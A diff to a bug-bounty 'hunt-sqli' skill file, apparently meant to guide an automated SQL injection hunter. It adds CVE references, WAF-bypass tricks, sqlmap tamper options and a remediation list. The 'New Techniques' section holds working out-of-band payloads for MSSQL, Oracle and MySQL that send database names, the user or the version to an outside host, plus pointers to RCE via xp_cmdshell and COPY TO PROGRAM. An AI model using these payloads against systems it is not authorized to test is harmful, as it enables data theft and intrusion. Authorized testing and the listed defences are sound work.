@@ -3,6 +3,9 @@ name: hunt-sqli
 description: Hunting skill for sqli vulnerabilities. Built from 12 public bug bounty reports including modern NoSQL injection (Rocket.Chat CVE-2021-22911 MongoDB $regex, Mongoose ORM CVE-2024-53900 $where bypass), modern ORM raw-fragment SQLi (Django CVE-2024-42005, Sequelize GHSA-wrh9-cjv3-2hpw), second-order SOQL injection (HackerOne Salesforce), time-based blind SQLi in GraphQL resolvers, and SQLi on OIDC-proxy backends. Use when hunting SQLi on any target. Dedicated NoSQL operator injection (MongoDB/CouchDB $where/$regex/$ne) is owned by hunt-nosqli — NoSQL appears here only as adjacent ORM/WAF context.
 sources: github, hackerone_public, github_security_advisories, snyk_research, sonarsource_research
 report_count: 29
+cwe: [CWE-89, CWE-564, CWE-943, CWE-20]
+cvss_baseline: "High (8.0) blind/time-based extraction → Critical (9.8) unauth injection with full read, stacked-query writes, or RCE (xp_cmdshell, COPY TO PROGRAM, LOAD_FILE/INTO OUTFILE)."
+related_skills: [hunt-sqliv2, hunt-nosqli, hunt-graphql, hunt-auth-bypass, triage-validation]
 ---
 
 ## Autonomous Testing Priority
@@ -412,6 +415,35 @@ The following real, verified bug-bounty / CVE / coordinated-disclosure cases ext
     - Year: 2023 — Mozilla H1 bounty (amount redacted in disclosure)
 
 ---
+
+## New Techniques (2024-2026)
+
+### OOB exfil beats timing (when egress allows)
+Prefer out-of-band over blind timing — faster, more reliable proof:
+```sql
+-- MSSQL
+'; DECLARE @q VARCHAR(1024);SET @q='\\'+(SELECT TOP 1 name FROM sys.databases)+'.OOB.oastify.com\x';EXEC master..xp_dirtree @q;--
+-- Oracle
+' || UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.OOB/')||'
+-- MySQL (Windows/UNC)   Postgres: COPY ... TO PROGRAM for egress/RCE
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.OOB\\x'))-- -
+```
+
+### JSON & modern-dialect SQLi
+MySQL 8 / Postgres JSON operators built from input (`->>`, `#>>`, `JSON_TABLE`, `jsonb_path_query`) are frequently string-concatenated. Postgres `COPY ... TO/FROM PROGRAM` = RCE when stacked queries reach a superuser; MSSQL `xp_cmdshell`/OLE automation; `INTO OUTFILE`/`LOAD_FILE` (MySQL `secure_file_priv`).
+
+### ORM raw-fragment & second-order (grounding)
+Django `CVE-2024-42005` (`QuerySet.values(*fields)` `__` injection), Sequelize raw-fragment GHSA, `ORDER BY`/identifier contexts bind-params can't cover. Second-order: stored benign, concatenated later by a report/export job — tag with a unique marker.
+
+### WAF bypass + automation
+`/*!50000UNION*/`, inline comments, scientific notation, `CASE WHEN`, overlong/Unicode, HTTP parameter pollution. `sqlmap --tamper=space2comment,charencode,between` + `--technique=T` for time-based; `ghauri` for faster blind. Validate every sqlmap hit manually.
+
+## Remediation
+
+- Parameterize all values; for identifiers/`ORDER BY`/`LIMIT`, use a strict server-side allowlist — never interpolate.
+- ORM: avoid `.raw()`/`RawSQL`/string-built `@Query`; never pass raw request objects as filters; patch ORM to fixed versions.
+- Least-privilege DB account (no FILE/PROGRAM/xp_cmdshell, no DDL, single-statement where possible); set `secure_file_priv`; disable OLE/`xp_cmdshell`.
+- WAF is defense-in-depth, not a fix; centralize query building and add CI checks for string-concatenated SQL.
 
 ## Related Skills & Chains
 
